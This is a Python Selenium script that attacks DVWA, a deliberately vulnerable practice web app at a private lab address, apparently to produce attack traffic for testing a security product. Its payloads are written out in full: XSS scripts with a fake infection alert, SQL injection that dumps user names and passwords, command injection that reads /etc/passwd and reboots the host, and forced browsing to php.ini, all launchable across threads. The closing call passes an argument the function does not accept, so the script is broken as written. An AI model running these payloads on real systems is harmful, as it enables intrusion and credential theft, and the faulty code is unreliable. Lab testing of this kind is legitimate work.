from selenium.webdriver import Firefox, FirefoxProfile
from selenium.webdriver.firefox.options import Options
from time import time, sleep
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException, UnexpectedAlertPresentException
import threading
import random
import string
import os


class DVWA(object):

    def __init__(self, url, username, password, headless=False, delay=0.1 ):
        opts = Options()
        download_dir = os.getcwd()
        
        if headless:
            opts.set_headless()
            assert opts.headless
        self.url = url
        self.username = username
        self.password = password
        self.delay = delay

        # perfect the below creating automated testing for hynsyt
        fp = FirefoxProfile()
        fp.set_preference("browser.download.folderList",2)
        fp.set_preference("browser.download.dir", download_dir)
        fp.set_preference("browser.download.manager.showWhenStarting", False)
        fp.set_preference("browser.helperApps.neverAsk.saveToDisk", "text/plain")

        self.browser = Firefox(options=opts, firefox_profile=fp)


    def login(self):
        self.browser.get(self.url)
        try:
            user_field = self.browser.find_element_by_name('username').send_keys(self.username)
            user_field = self.browser.find_element_by_name('password').send_keys(self.password)
            submit_button = self.browser.find_element_by_name('Login').click()
        except NoSuchElementException:
            # required if the session is still valid and the web server dont ask for username password
            pass

    def reset_settings(self):
        try:
            create_db = self.browser.find_element_by_name('create_db').click()
            self.login()
        except NoSuchElementException:
            pass

    def click_list_of_link_text(self, link_list):
        for i in link_list:
            try:
                self.browser.find_element_by_link_text(i).click()
            except NoSuchElementException:
                print(f'Element dont exist error: {i}')
            
    def explore_instructions(self):
        link_list = ['Instructions', 'Read Me', 'PDF Guide', 'Change Log', 'Copying', 'PHPIDS License' ]
        self.click_list_of_link_text(link_list)

    def click_all_side_bar(self):
        side_bar = self.browser.find_element_by_id('main_menu_padded')
        all_a = side_bar.find_elements_by_tag_name('a')
        a_text_list = [ x.text for x in all_a ] 
        for i in a_text_list:
            try:
                self.browser.find_element_by_link_text(i).click()
            except NoSuchElementException:
                self.login()

    @staticmethod
    def connect_check_close(url, username, password, headless):
        session = DVWA(url, username, password, headless)
        session.login()
        session.reset_settings()
        session.explore_instructions()
        session.click_all_side_bar()
        session.login()
        session.cross_site_script()
        session.sql_injection()
        session.command_injection()
        session.forceful_browsing()
        session.browser.close()

    def cross_site_script(self):
        url = self.url + '/vulnerabilities/xss_r/'
        s1 = '";!--"<BOBUSER>=&{()}'
        s2 = '<script>alert("your system is infected! call Iwoz for help")</script>'
        s3 = '<script>window.location="https://www.hackthissite.org/pages/index/index.php"</script>'
        s4 = '<iframe src="https://www.pandasecurity.com/mediacenter/src/uploads/2019/07/pandasecurity-How-do-hackers-pick-their-targets.jpg" width="500" height="500"></iframe>'
        attack_list = [s1, s2, s3, s4]
        values = [ DVWA.random_string( random.randint(1,100) ) for x in range(5) ]
        values += attack_list
        for s in values:
            try:
                self.browser.get(url)
                self.browser.find_element_by_name('name').send_keys(s)
                self.browser.find_element_by_name('XSS').submit()
                sleep(self.delay)
            except UnexpectedAlertPresentException:
                self.login()
                self.browser.get(url)
                self.browser.find_element_by_name('name').send_keys(s)
                self.browser.find_element_by_name('XSS').submit()
                sleep(self.delay)

    def sql_injection(self):
        url = self.url + '/vulnerabilities/sqli/'
        values = [ str(x) for x in range(1, 10) ]
        s1 = "%' or 1='1"
        s2 = "' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #"
        s3 = "$username = 1' or '1' = '1"
        s4 = "' and 1=0 union select null, concat (first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #"
        attack_list = [ s1, s2, s3, s4 ]
        values += attack_list
        for i in values:
            self.browser.get(url)
            self.browser.find_element_by_name('id').send_keys(i)
            self.browser.find_element_by_name('Submit').click()
            sleep(self.delay)

    def command_injection(self):
        url = self.url + '/vulnerabilities/exec/#'
        values = ['8.8.8.8', '9.9.9.9', '5.5.5.5', '4.4.4.4']
        s1 = '1 | ls /etc'
        s2 = '1 | cat /etc/passwd'
        s3 = '1 | ip addr'
        s4 = '1 | reboot'
        attack_list = [ s1, s2, s3, s4 ]
        values += attack_list
        for i in values:
            try:
                self.browser.get(url)
                self.browser.find_element_by_name('ip').send_keys(i)
                self.browser.find_element_by_name('Submit').click()
                sleep(self.delay)
            except NoSuchElementException:
                pass
            

    def forceful_browsing(self):
        u1 = '/php.ini'
        # u2 ='/README.md' # this will download the file and selenium currently cannot handle it
        url_list = [ self.url + u1 ]
        for i in url_list:
            self.browser.get(i)
            sleep(self.delay)

    @staticmethod
    def random_string(n):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(n))




def login_bot_thread(n_request, max_thread, url, username, password, headless):
    threads = []
    for i in range(n_request):
        print(i)
        th = threading.Thread(target=DVWA.connect_check_close, args=(url, username, password, headless))
        threads.append(th)
        th.start()
        while threading.active_count() > max_thread:
            sleep(.1)
    for th in threads:
        th.join()


login_bot_thread(1, 1, 'http://172.16.224.102', 'admin', 'password', headless=False, delay=.1)




